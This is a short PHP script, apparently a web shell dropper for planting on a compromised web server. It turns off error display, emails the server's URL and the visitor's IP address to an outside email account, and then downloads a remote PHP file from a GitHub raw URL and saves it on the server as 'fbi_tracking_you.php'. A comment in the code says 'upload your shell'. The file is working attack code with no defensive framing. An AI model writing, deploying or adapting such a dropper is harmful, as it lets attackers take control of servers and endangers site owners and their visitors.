<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
$to = 'mhmtalishn@live.com';
$path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$message = "URL: $path | IP Address :[ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($to, "Onii Chan Baka??!!", $message, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
$nama= fopen("fbi_tracking_you.php" ,"w+");
$file = file_get_contents('https://raw.githubusercontent.com/RootShelll/Additional-Files/refs/heads/main/wp_save.php'); # upload your shell
$tulis = fwrite ($nama ,$file);
fclose($nama);
?>
